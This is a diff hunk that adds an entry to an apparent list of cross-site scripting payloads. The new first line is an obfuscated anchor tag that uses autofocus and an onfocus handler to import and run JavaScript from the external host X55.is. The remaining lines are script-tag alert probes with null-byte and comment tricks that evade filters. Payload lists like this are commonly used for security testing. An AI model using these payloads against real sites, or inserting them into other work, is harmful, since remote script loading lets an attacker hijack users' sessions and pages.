@@ -1,3 +1,4 @@
+<A HRef=//X55.is AutoFocus %26%2362 OnFocus%0C=import(href)>
 ;<script>alert(1)</script>
 ;<sc%00ript>alert/**/(1)</script>
 ;<sc%00ript/test='asdf'>alert/**/(1)</script>
